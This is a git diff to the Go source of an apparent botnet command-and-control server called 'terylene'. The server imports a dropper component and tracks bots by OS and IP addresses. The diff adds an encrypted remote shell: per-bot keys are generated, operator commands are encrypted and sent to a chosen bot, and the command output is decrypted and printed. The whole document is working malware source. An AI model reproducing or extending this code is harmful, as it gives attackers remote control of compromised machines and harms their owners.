@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"fmt"
 	"io"
+	"log"
 	"net"
 	"net/http"
 	"os"
@@ -12,7 +13,9 @@ import (
 	"strings"
 	"sync"
 	config "terylene/config"
+	zcrypto "terylene/crypto"
 	dropper "terylene/server/components/dropper"
+	"terylene/server/components/fade"
 	"terylene/server/components/setup"
 	"terylene/server/components/transfer"
 	poly "terylene/server/theme/default"
@@ -23,17 +26,20 @@ import (
 )
 
 type Botstruc struct {
-	arch    string
-	OS      string
-	localip string
-	pubip   string
-	connID  string
+	conn       string
+	arch       string
+	OS         string
+	localip    string
+	pubip      string
+	connID     string
+	reversekey string
 }
 
 var (
 	connIDs     = make(map[string]string)
 	tera        = make(map[string]Botstruc)
 	aliveclient = make(map[string]time.Time)
+	shell       = false
 	pubmutex    sync.Mutex
 	routmutex   sync.Mutex
 )
@@ -124,38 +130,65 @@ func routerhandle(router *zmq.Socket) {
 						router.SendMessage(msg[0], "kys")
 						routmutex.Unlock()
 					} else {
+						key, err := zcrypto.GenerateRandomKey(32)
+						if err != nil {
+							log.Fatalln("Key generation failed")
+						}
 						bot := Botstruc{
-							arch:    msg[2],
-							OS:      msg[3],
-							localip: msg[4],
-							pubip:   msg[5],
-							connID:  msg[6],
+							conn:       msg[0],
+							arch:       msg[2],
+							OS:         msg[3],
+							localip:    msg[4],
+							pubip:      msg[5],
+							connID:     msg[6],
+							reversekey: string(key),
 						}
 						tera[msg[0]] = bot
 						connIDs[msg[0]] = msg[6]
+						enckey, err := zcrypto.EncryptAES256(key, []byte(config.AESkey))
+						if err != nil {
+							log.Fatalln(err)
+						}
 						routmutex.Lock()
-						router.SendMessage(msg[0], "terylene", config.Broadcastport)
+						router.SendMessage(msg[0], "terylene", config.Broadcastport, enckey)
 						routmutex.Unlock()
 					}
 				}
 			}
 
 			if len(msg) == 2 {
-				if len(msg) == 2 {
-					if msg[1] == "h" {
-						aliveclient[msg[0]] = time.Now()
-					} else if msg[1] == "injustice" {
-						routmutex.Lock()
-						router.SendMessage(msg[0], "justice")
-						routmutex.Unlock()
-					} else if msg[1] == "isdone" {
-						routmutex.Lock()
-						router.SendMessage(msg[0], "isserved")
-						routmutex.Unlock()
+				if msg[1] == "h" {
+					aliveclient[msg[0]] = time.Now()
+				} else if msg[1] == "injustice" {
+					routmutex.Lock()
+					router.SendMessage(msg[0], "justice")
+					routmutex.Unlock()
+				} else if msg[1] == "isdone" {
+					routmutex.Lock()
+					router.SendMessage(msg[0], "isserved")
+					routmutex.Unlock()
+				}
+			}
+			if len(msg) == 3 {
+				if shell == true {
+					var polykey string
+					for _, key := range tera {
+						if msg[0] == key.conn {
+							polykey = key.reversekey
+						}
+					}
+					decoutput, err := zcrypto.DecryptChaCha20Poly1305([]byte(msg[2]), []byte(polykey))
+					if err != nil {
+						log.Println(err)
+						return
+					}
+					if msg[1] == "cmdS" {
+						fmt.Println(fmt.Sprintf("\033[32m%s\033[0m", strings.Trim(string(decoutput), "\n")))
+					} else {
+						fmt.Println(fmt.Sprintf("\x1b[31m%s\x1b[0m", strings.Trim(string(decoutput), "\n")))
 					}
 				}
 			}
-
 		}(msg)
 	}
 }
@@ -293,6 +326,57 @@ func getpubIp() string {
 	return string(ip)
 }
 
+func reversehandler(connID string, scanner *bufio.Scanner, router *zmq.Socket) {
+	clearScreen()
+	var polykey string
+	var conn string
+	shell = true
+	for _, value := range tera {
+		if value.connID == connID {
+			polykey = value.reversekey
+			conn = value.conn
+		}
+	}
+
+	if polykey == "" {
+		fmt.Print(fade.Amber(poly.Shellart3))
+		fmt.Printf("\nNo such terylene connID: %s\n", connID)
+		return
+	} else {
+		fmt.Print(fade.Water(poly.Shellart))
+	}
+	for {
+		scanner.Scan()
+		err := scanner.Err()
+		if err != nil {
+			log.Fatalln(err)
+		}
+		command := scanner.Text()
+
+		if command == "" {
+			continue
+		}
+
+		if command == "clear" {
+			clearScreen()
+		}
+
+		if command == "exit" || command == "background" {
+			clearScreen()
+			shell = false
+			fmt.Print(fade.Water(poly.Shellart2))
+			break
+		}
+		encommand, err := zcrypto.EncryptChaCha20Poly1305([]byte(command), []byte(polykey))
+		if err != nil {
+			log.Fatalln(err)
+		}
+		routmutex.Lock()
+		router.SendMessage(conn, "cmd", string(encommand))
+		routmutex.Unlock()
+	}
+}
+
 func main() {
 	scanner := bufio.NewScanner(os.Stdin)
 
@@ -317,7 +401,7 @@ func main() {
 	go routerhandle(router)
 
 	for {
-		terminalcolor.Printf(poly.Cmd)
+		terminalcolor.Print(poly.Cmd)
 		scanner.Scan()
 
 		command := scanner.Text()
@@ -335,9 +419,19 @@ func main() {
 		if strings.Contains(command, "kill") {
 			fmt.Println(killprompt(command, router, publisher))
 		}
+
+		if strings.Contains(command, "shell") {
+			parts := strings.Fields(command)
+			if len(parts) != 2 {
+				fmt.Println(poly.Shellhelp)
+				continue
+			}
+			reversehandler(parts[1], scanner, router)
+		}
+
 		switch command {
 		case "help":
-			fmt.Println(poly.Help)
+			fmt.Printf(strings.TrimLeft(poly.Help, "\n"))
 		case "clear":
 			clearScreen()
 		case "exit":
@@ -347,7 +441,7 @@ func main() {
 			color.Red("[✔] successfully shutdown router")
 			os.Exit(1)
 		case "methods":
-			fmt.Println(poly.Methods)
+			fmt.Printf(strings.TrimLeft(poly.Methods, "\n"))
 		case "list":
 			fmt.Println("Number of bots:", len(aliveclient))
 			if len(aliveclient) != 0 {
